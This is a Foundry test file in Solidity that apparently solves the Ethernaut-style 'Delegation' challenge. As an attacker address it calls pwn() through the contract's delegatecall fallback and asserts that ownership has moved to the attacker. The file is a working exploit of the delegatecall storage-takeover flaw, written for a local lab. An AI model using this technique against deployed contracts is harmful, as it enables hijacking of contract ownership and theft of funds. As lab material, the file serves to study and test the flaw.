// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    // Create test addresses
    address ownerDelegate = makeAddr("ownerDelegate");
    address Attacker = makeAddr("Attacker");

    function setUp() public {
        vm.prank(ownerDelegate);
        delegate = new Delegate(ownerDelegate);
        vm.prank(ownerDelegate);
        delegation = new Delegation(address(delegate));
    }

    function test_attack() public {
        console.log("[BEFORE] Delegate owner: %s; Delegation owner: %s", delegate.owner(), delegation.owner());

        vm.prank(Attacker);
        (bool success, bytes memory data) = address(delegation).call(abi.encodeWithSignature("pwn()"));

        console.log("[AFTER] Delegate owner: %s; Delegation owner: %s", delegate.owner(), delegation.owner());
        assertEq(delegation.owner(), Attacker);
    }
}
